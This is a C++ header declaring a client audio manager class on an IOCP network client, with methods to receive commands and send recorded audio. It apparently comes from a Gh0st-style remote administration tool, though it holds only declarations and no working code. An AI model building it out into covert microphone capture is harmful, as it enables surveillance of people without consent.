#pragma once
#include "Manager.h"
#include "Audio.h"
class CClientAudioManager :
    public CManager
{
public:
	CClientAudioManager(_CIOCPClient* IOCPClient);
	~CClientAudioManager();
	BOOL OnInitMember();
	static DWORD ReceiveProcedure(LPVOID ParameterData);
	void HandleIO(PBYTE BufferData, ULONG_PTR BufferLength);
	int SendRecordData();
private:
	BOOL     m_IsLoop;
	CAudio* m_Audio;
	HANDLE   m_WorkThreadHandle = NULL;
};

